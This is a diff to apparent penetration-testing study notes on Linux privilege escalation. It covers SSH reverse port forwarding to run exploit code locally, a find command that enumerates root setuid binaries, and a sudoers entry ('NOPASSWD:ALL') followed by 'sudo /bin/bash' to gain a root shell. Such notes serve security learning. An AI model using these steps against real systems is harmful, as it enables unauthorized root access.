@@ -52,7 +52,14 @@ ssh -R <local-port>:127.0.0.1:<service-port> <username>@,local-machine>
 
 the exploit code can now be run on your local machine at whichever port you choose
 ---------------------------------
-WEAK FILE PERMISSIONS
+Setuid programs 
+
+this comand will search for all setuid programs:
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+IF WE CAN SOMEHOW WRITE OUR USER ON THE BOX INTO THE /ETC/SUDOERS WITH NO PASSWORD INTO THE FILE WE CAN ESCALATE TO ROOT
+entry in sudoers file: student ALL(ALL) NOPASSWD:ALL
+command: sudo /bin/bash
 
 
 
